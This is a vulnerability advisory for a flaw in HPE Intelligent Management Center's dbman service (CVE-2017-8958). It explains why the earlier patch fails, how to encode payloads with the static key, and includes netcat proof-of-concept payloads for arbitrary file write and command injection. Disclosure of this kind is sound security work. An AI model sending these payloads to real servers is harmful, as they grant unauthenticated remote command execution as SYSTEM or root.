# HPE Intelligent Management Center dbman Multiple Vulnerabilities (CVE-2017-8958)

## Advisory

https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-hpesbhf03786en_us

## Affected Vendor:

Hewlett Packard Enterprise

## Affected Components:

dbman in HPE IMC version 7.3 E0504P04

## Vulnerability Details:

On May 15th 2017, HPE released two security bulletins announcing 8 CVEs in Intelligent Management Center:

https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us (CVE-2017-5816, CVE-2017-5817, CVE-2017-5818, CVE-2017-5819)
https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03746en_us (CVE-2017-5820, CVE-2017-5821, CVE-2017-5822, CVE-2017-5823)

These vulnerabilities were disclosed by a researcher through ZDI who disclosed the problem location:
the dbman service. The vulnerabilities include command injection, arbitrary file write, and 
arbitrary file deletion. The commands and the corresponding vulnerabilities are as follows:

  - FileTrans (opcode 10010) - arbitrary file write vulnerability
  - DbaToimcUser (opcode 10013) - command injection vulnerability
  - RestartDB (opcode 10008) - command injection vulnerability
  - RestoreDBase (opcode 10007) 
    - 2 command injection vulnerabilities (one for MySQL databases, one for SQL server) and an 
        arbitrary file deletion vulnerability
  - RestoreZipFile (opcode 10006) - command injection vulnerability
  - BackupZipFile (opcode 10004) - command injection vulnerability

They were patched in IMC version 7.3 E0504P04. However, the patch is insufficient. The patch attempts 
to fix the problem by encoding or encrypting the ASN.1 messages using `dbman_encode_len()`. Then 
when the service receives a command, it attempts to decode it using `dbman_decode_len()`. The encoding
and decoding appears to occur with a static key or seed derived from the string "liuan814". The 
consequence of this is encoded commands being accepted by any installation of IMC 7.3 E0504P04. An 
attacker just needs to encode their malicious payload once and then they will be able to exploit any IMC 
server running the latest, fully patched version. Thus the encoding protection is insufficient and all 
of the above commands are vulnerable.

As to how an attacker could encode their payload, they can patch the decoding to encode instead. 
Since `dbman_decode_len()` and `dbman_encode_len()` take the same number of arguments and the former is 
essentially an unwinding of the latter, you could easily substitute a function call to `dbman_decode_len()`
with a function call to `dbman_encode_len()`. Instead of failing to decode an unencoded command, the program 
will instead encode it. Afterwards you can retrieve from memory the encoded payload in the result buffer. 
This payload is valid and can be successfully decoded.

The impact of the vulnerabilities is remote, unauthenticated command execution as SYSTEM or root.

## Remediation:

An authentication mechanism needs to be implemented to protect the dbman service. Additionally, any parameters 
that are used in an executed command must be sanitized.

## Proof of Concept:

Two proof-of-concepts have been provided to demonstrate the insufficient protection provided by the patch.
To run it, first set the IMC_SERVER environment variable to the IP address of a running, fully patched 
IMC server installed on Windows (version 7.3 E0504P04):
```
export IMC_SERVER=<IP_ADDRESS>
```
Then run the following commands to demonstrate the vulnerabilities:

### FileTrans
``` 
echo '0000271A00000020B344547B3D86892F8CFF9E66FC27620CE42491328BC720525399A5549DF50B7274657374' | xxd -r -p | nc $IMC_SERVER 2810
```
Result: File "C:\proof_of_concept" created with contents "test"

### BackupZipFile
```
echo '00002714000000B8E4588B59BDBFA76A6BCD049D9561DFF5ABBEEF6F5399331FEA4BF954145A18F8B1C2D1B3822433BF7B4830B86593B689E9ABE760FE2D3195E42491328BC72052F7E6C3BE52BA0F1C770B293DB324DF7306C148CE122D9808A3E6BF4168FFA7A560650CCB9BAE262DFF77BBC28288AF6D008CB77E853D4644CE37611765ED3185CB33967192063BA698204AACF947D927D7ECB6AC2E8B52B771B1ADE31A00DC7B10E46EB4C0A00D9BC71817A6E7DC90A4A8AC627CAD224981' | xxd -r -p | nc $IMC_SERVER 2810
```
Results: 
  - Command injected: "echo test-BackupZipFile >> C:\proof_of_concept & " (in sqlScript field)
  - Command executed: "cmd.exe /c echo test-BackupZipFile >> C:\proof_of_concept & "test3" test1 test7 test5 >"C:\Program Files\iMC\dbman\bin\dbop.sql.log" 2>&1"
  - The file "proof_of_concept" appears in the root directory of the C drive with the contents "test-BackupZipFile"
